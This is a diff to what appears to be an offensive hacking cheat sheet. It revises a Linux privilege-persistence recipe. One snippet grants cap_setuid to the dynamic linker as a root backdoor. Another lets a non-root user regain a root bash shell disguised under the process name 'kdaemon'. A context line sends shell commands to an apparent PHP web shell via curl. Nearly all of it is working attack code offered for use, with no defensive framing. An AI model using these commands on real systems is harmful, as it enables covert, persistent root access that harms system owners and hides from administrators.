@@ -1628,19 +1628,16 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 
 Stay root once you got root
 ```bash
-setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
-|| setcap cap_setuid+ep /lib64/ld-linux-x86-64.so.2 \
-|| setcap cap_setuid+ep /lib64/ld-2.17.so 2>/dev/null \
-|| echo >&2 "FAILED. File not found"
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
+setcap cap_setuid+ep "${fn}"
 ```
 Become root
 ```bash
 ### Execute as non-root user
+fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 p="python"
 command -v python3 >/dev/null && p="python3"
-[[ -f /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ]] && l="/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
-[[ -f /lib64/ld-2.17.so ]] && l="/lib64/ld-2.17.so"
-exec "${l:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+exec "${fn:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
 ```
 
 <a id="implant"></a>
